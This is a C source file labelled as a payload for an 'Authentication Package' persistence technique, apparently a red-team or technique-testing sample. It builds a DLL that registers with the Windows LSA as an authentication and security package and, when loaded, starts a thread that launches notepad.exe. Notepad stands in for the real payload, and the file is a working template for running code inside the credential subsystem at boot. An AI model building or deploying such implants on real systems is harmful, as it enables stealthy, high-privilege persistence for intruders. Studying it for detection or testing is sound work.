/*
    Payload for TT1547.002 (Authentication Package)
    Author: tr4cefl0w
*/

#include <ntstatus.h>
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#pragma comment(lib, "Secur32.lib")

int Run(void) {

	STARTUPINFO si={sizeof(si)};
    PROCESS_INFORMATION pi;

	CreateProcess(
		"c:\\windows\\notepad.exe", 
		"", NULL, NULL, TRUE, 0, NULL, NULL, 
		&si, &pi);

	return 0;
}

LSA_DISPATCH_TABLE DispatchTable;

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }
NTSTATUS NTAPI SpShutDown(void) { return 0; }
NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo) {
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wVersion = 1;
	PackageInfo->wRPCID = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->Name = (SEC_WCHAR *)L"MyAuthenticationPackage";
	PackageInfo->Comment = (SEC_WCHAR *)L"MyAuthenticationPackage";

	return 0;
}

NTSTATUS LsaApInitializePackage(ULONG AuthenticationPackageId,
								  PLSA_DISPATCH_TABLE LsaDispatchTable,
								  PLSA_STRING Database,
								  PLSA_STRING Confidentiality,
								  PLSA_STRING *AuthenticationPackageName
								  ) {
	
    PLSA_STRING name = NULL;

	HANDLE th;
	
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Run, 0, 0, 0);
	WaitForSingleObject(th, 0);

    DispatchTable.CreateLogonSession = LsaDispatchTable->CreateLogonSession;
    DispatchTable.DeleteLogonSession = LsaDispatchTable->DeleteLogonSession;
    DispatchTable.AddCredential = LsaDispatchTable->AddCredential;
    DispatchTable.GetCredentials = LsaDispatchTable->GetCredentials;
    DispatchTable.DeleteCredential = LsaDispatchTable->DeleteCredential;
    DispatchTable.AllocateLsaHeap = LsaDispatchTable->AllocateLsaHeap;
    DispatchTable.FreeLsaHeap = LsaDispatchTable->FreeLsaHeap;
    DispatchTable.AllocateClientBuffer = LsaDispatchTable->AllocateClientBuffer;
    DispatchTable.FreeClientBuffer = LsaDispatchTable->FreeClientBuffer;
    DispatchTable.CopyToClientBuffer = LsaDispatchTable->CopyToClientBuffer;
    DispatchTable.CopyFromClientBuffer = LsaDispatchTable->CopyFromClientBuffer;

    name = (LSA_STRING *)LsaDispatchTable->AllocateLsaHeap(sizeof *name);
    name->Buffer = (char *)LsaDispatchTable->AllocateLsaHeap(sizeof("SubAuth") + 1);

    name->Length = sizeof("SubAuth") - 1;
    name->MaximumLength = sizeof("SubAuth");
    strcpy_s(name->Buffer, sizeof("SubAuth") + 1, "SubAuth");

    (*AuthenticationPackageName) = name;

	return 0;
}

NTSTATUS LsaApLogonUser(PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID AuthenticationInformation,
  PVOID ClientAuthenticationBase,
  ULONG AuthenticationInformationLength,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferLength,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PLSA_UNICODE_STRING *AccountName,
  PLSA_UNICODE_STRING *AuthenticatingAuthority) {
	  return 0;
  }

NTSTATUS LsaApCallPackage(PLSA_CLIENT_REQUEST ClientRequest,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferLength,
  PVOID *ProtocolReturnBuffer,
  PULONG ReturnBufferLength,
  PNTSTATUS ProtocolStatus
  ) {
	  return 0;
  }

void LsaApLogonTerminated(PLUID LogonId) {  }

NTSTATUS LsaApCallPackageUntrusted(
   PLSA_CLIENT_REQUEST ClientRequest,
   PVOID               ProtocolSubmitBuffer,
   PVOID               ClientBufferBase,
   ULONG               SubmitBufferLength,
   PVOID               *ProtocolReturnBuffer,
   PULONG              ReturnBufferLength,
   PNTSTATUS           ProtocolStatus
  ) {
	  return 0;
  }

NTSTATUS LsaApCallPackagePassthrough(
  PLSA_CLIENT_REQUEST ClientRequest,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferLength,
  PVOID *ProtocolReturnBuffer,
  PULONG ReturnBufferLength,
  PNTSTATUS ProtocolStatus
  ) {
	  return 0;
  }

NTSTATUS LsaApLogonUserEx(
  PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID AuthenticationInformation,
  PVOID ClientAuthenticationBase,
  ULONG AuthenticationInformationLength,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferLength,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PUNICODE_STRING *AccountName,
  PUNICODE_STRING *AuthenticatingAuthority,
  PUNICODE_STRING *MachineName
  ) {
	  return 0;
  }

NTSTATUS LsaApLogonUserEx2(
  PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferSize,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferSize,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PUNICODE_STRING *AccountName,
  PUNICODE_STRING *AuthenticatingAuthority,
  PUNICODE_STRING *MachineName,
  PSECPKG_PRIMARY_CRED PrimaryCredentials,
  PSECPKG_SUPPLEMENTAL_CRED_ARRAY *SupplementalCredentials
  ) {
	  return 0;
  }

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = {
	{
		LsaApInitializePackage,
		LsaApLogonUser,
		LsaApCallPackage,
		LsaApLogonTerminated,
		LsaApCallPackageUntrusted,
		LsaApCallPackagePassthrough,
		LsaApLogonUserEx,
		LsaApLogonUserEx2,
		SpInitialize,
		SpShutDown,
		(SpGetInfoFn *) SpGetInfo, 
		NULL, NULL, NULL, NULL, NULL,
		NULL, NULL, NULL, NULL, NULL,
		NULL, NULL, NULL, NULL, NULL,
		NULL 
	}
};

NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables) {
	HANDLE th;
	
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Run, 0, 0, 0);
	WaitForSingleObject(th, 0);
	
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = SecurityPackageFunctionTable;
	*pcTables = 1;
		
	return STATUS_SUCCESS;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
		}
	return TRUE;
}